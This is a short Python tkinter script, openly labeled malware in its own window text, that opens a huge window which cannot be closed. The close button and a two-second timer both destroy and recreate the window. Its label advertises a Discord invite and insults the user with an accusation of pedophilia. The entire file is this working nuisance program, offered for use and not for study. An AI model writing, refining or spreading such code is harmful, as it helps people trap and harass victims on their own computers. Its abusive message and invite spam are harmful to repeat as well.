
import tkinter as tk
import time

current_window = None
current_timer_id = None

def recreate_window():
    global current_window, current_timer_id

    if current_window:
        if current_timer_id is not None:
            try:
                current_window.after_cancel(current_timer_id)
            except tk.TclError:
                pass

        current_window.destroy()
        current_window = None
        current_timer_id = None

    create_new_window()

def create_new_window():
    global current_window, current_timer_id

    root = tk.Tk()
    root.title("Dynamic Window - New Instance")
    root.geometry("2000x2000")
    root.resizable(True, True)

    label_text = f"discord.gg/crucifixion (no you cant close this window either) (yes this is malware) (yes it is because you are a pedo) (current time): {time.strftime('%H:%M:%S')}"
    label = tk.Label(root, text=label_text, font=("Arial", 16), padx=2000, pady=200)
    label.pack()

    root.protocol("WM_DELETE_WINDOW", recreate_window)

    current_timer_id = root.after(2000, recreate_window)

    current_window = root

    root.mainloop()

if __name__ == "__main__":
    create_new_window()